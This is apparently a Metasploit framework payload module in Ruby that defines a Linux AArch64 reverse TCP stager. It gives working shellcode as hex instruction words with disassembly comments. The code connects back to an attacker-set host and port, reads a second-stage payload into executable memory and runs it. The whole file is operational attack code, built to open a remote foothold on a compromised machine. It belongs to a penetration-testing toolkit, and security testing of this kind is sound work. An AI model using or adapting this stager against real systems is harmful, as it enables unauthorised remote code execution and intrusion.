##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core/handler/reverse_tcp'


###
#
# ReverseTcp
# ----------
#
# Linux reverse TCP stager.
#
###
module MetasploitModule

  CachedSize = 212

  include Msf::Payload::Stager

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse TCP Stager',
      'Description'   => 'Connect back to the attacker',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_AARCH64,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Stager'        =>
        {
          'Offsets' =>
            {
              'LPORT' => [ 206, 'n'    ],
              'LHOST' => [ 208, 'ADDR' ],
            },
          'Payload' =>
          [
            # Generated from external/source/shellcode/linux/aarch64/stager_sock_reverse.s
            0xd2800040,          #  mov	x0, #0x2                   	// #2
            0xd2800021,          #  mov	x1, #0x1                   	// #1
            0xd2800002,          #  mov	x2, #0x0                   	// #0
            0xd28018c8,          #  mov	x8, #0xc6                  	// #198
            0xd4000001,          #  svc	#0x0
            0xaa0003ec,          #  mov	x12, x0
            0x100005a1,          #  adr	x1, cc <sockaddr>
            0xd2800202,          #  mov	x2, #0x10                  	// #16
            0xd2801968,          #  mov	x8, #0xcb                  	// #203
            0xd4000001,          #  svc	#0x0
            0x350004c0,          #  cbnz	w0, c0 <failed>
            0xaa0c03e0,          #  mov	x0, x12
            0xd10043ff,          #  sub	sp, sp, #0x10
            0x910003e1,          #  mov	x1, sp
            0xd2800082,          #  mov	x2, #0x4                   	// #4
            0xd28007e8,          #  mov	x8, #0x3f                  	// #63
            0xd4000001,          #  svc	#0x0
            0xb100041f,          #  cmn	x0, #0x1
            0x540003c0,          #  b.eq	c0 <failed>
            0xb94003e2,          #  ldr	w2, [sp]
            0xd34cfc42,          #  lsr	x2, x2, #12
            0x91000442,          #  add	x2, x2, #0x1
            0xd374cc42,          #  lsl	x2, x2, #12
            0xaa1f03e0,          #  mov	x0, xzr
            0xaa0203e1,          #  mov	x1, x2
            0xd28000e2,          #  mov	x2, #0x7                   	// #7
            0xd2800443,          #  mov	x3, #0x22                  	// #34
            0xaa1f03e4,          #  mov	x4, xzr
            0xaa1f03e5,          #  mov	x5, xzr
            0xd2801bc8,          #  mov	x8, #0xde                  	// #222
            0xd4000001,          #  svc	#0x0
            0xb100041f,          #  cmn	x0, #0x1
            0x54000200,          #  b.eq	c0 <failed>
            0xb94003e4,          #  ldr	w4, [sp]
            0xf90003e0,          #  str	x0, [sp]
            0xaa0003e3,          #  mov	x3, x0
            0xaa0c03e0,          #  mov	x0, x12
            0xaa0303e1,          #  mov	x1, x3
            0xaa0403e2,          #  mov	x2, x4
            0xd28007e8,          #  mov	x8, #0x3f                  	// #63
            0xd4000001,          #  svc	#0x0
            0xb100041f,          #  cmn	x0, #0x1
            0x540000c0,          #  b.eq	c0 <failed>
            0x8b000063,          #  add	x3, x3, x0
            0xeb000084,          #  subs	x4, x4, x0
            0x54fffee1,          #  b.ne	90 <read_loop>
            0xf94003e0,          #  ldr	x0, [sp]
            0xd63f0000,          #  blr	x0
            0xd2800000,          #  mov	x0, #0x0                   	// #0
            0xd2800ba8,          #  mov	x8, #0x5d                  	// #93
            0xd4000001,          #  svc	#0x0
            0x5c110002,          #  .word	0x5c110002
            0x0100007f,          #  .word	0x0100007f
          ].pack("V*")
        }
      ))
  end

  def handle_intermediate_stage(conn, payload)
    print_status("Transmitting stage length value...(#{payload.length} bytes)")

    address_format = 'V'

    # Transmit our intermediate stager
    conn.put( [ payload.length ].pack(address_format) )

    return true
  end

end
